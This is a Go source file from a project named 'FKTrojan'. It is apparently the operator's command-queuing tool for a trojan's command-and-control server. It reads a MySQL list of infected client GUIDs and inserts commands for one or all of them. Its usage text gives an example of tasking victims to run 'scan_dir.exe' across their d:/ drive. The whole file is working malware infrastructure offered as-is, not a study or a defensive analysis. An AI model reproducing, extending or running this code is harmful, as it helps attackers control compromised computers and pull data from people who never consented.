package main

import (
	"FKTrojan/server"
	"database/sql"

	"encoding/json"

	"FKTrojan/common"
	"time"

	"os"

	"io/ioutil"

	_ "github.com/go-sql-driver/mysql"
	"github.com/qiniu/log"
	"github.com/urfave/cli"
)

var (
	g_guid string
	g_cmd  string
	DB     *sql.DB
)

func addCommand(args ...string) error {
	return nil
}

func getGUID() ([]string, error) {
	if g_guid != "all" {
		return []string{g_guid}, nil
	}
	rows, err := DB.Query("SELECT guid from clients")
	if err != nil {
		return nil, err
	}
	ret := make([]string, 0)
	defer rows.Close()
	for rows.Next() {
		var guid []byte
		err = rows.Scan(&guid)
		if err != nil {
			return nil, err
		}
		//fmt.Printf("guid is : %s\n", string(guid))
		ret = append(ret, string(guid))
	}
	return ret, rows.Err()
}

func insertOne(guid, cmd string) (int64, error) {
	ret, err := DB.Exec("INSERT into command (status, guid,command, timeanddate) values (?,?,?,?)", common.STATUS_NEW, guid, cmd, time.Now().Format(time.RFC850))
	if err != nil {
		return -1, err
	}
	return ret.LastInsertId()
}
func main() {
	var err error
	DB, err = sql.Open("mysql", server.MySQLUser+":"+server.MySQLPass+"@"+server.MySQLHost+"/"+server.MySQLName)
	if err != nil {
		log.Fatal("sql.Open error %v", err)
	}
	defer DB.Close()
	// 检查服务器是否开启
	err = DB.Ping()
	if err != nil {
		log.Fatal("sql.Ping error %v", err)
	}
	app := cli.NewApp()
	app.Name = "add_command"
	app.Version = "20180305"
	app.Usage = "add command in server"
	app.Author = "me"
	app.Email = "me@me.com"
	app.Flags = []cli.Flag{
		cli.StringFlag{
			Name:        "guid, g",
			Usage:       "client guid, all means add for all clients",
			Destination: &g_guid,
		},
		cli.StringFlag{
			Name:        "cmd, c",
			Usage:       "cmd string for table command, example \"2x6|scan_dir.exe|-dir|d:/|-depth|2\"",
			Destination: &g_cmd,
		},
	}
	app.Action = func(c *cli.Context) error {
		return nil
	}
	app.HideHelp = true
	app.HideVersion = true
	err = app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
	if g_guid == "" {
		log.Fatal("guid is nil")

	}

	if g_cmd == "" {
		log.Fatal("cmd is nil")
	}
	guids, err := getGUID()

	if err != nil {
		log.Fatal("getGUID error %v", err)
	}
	//log.Printf("len is %d value is %v ", len(guids), guids)
	ids := make([]int64, 0)
	for _, guid := range guids {
		id, err := insertOne(guid, g_cmd)
		if err != nil {
			log.Fatal("insert One error %v", err)
		}
		ids = append(ids, id)
	}
	js, err := json.MarshalIndent(ids, " ", " ")
	if err != nil {
		log.Fatal("json.mashal error %v", err)
	}
	idFile := "./insert_id.txt"
	ioutil.WriteFile(idFile, js, 644)
}
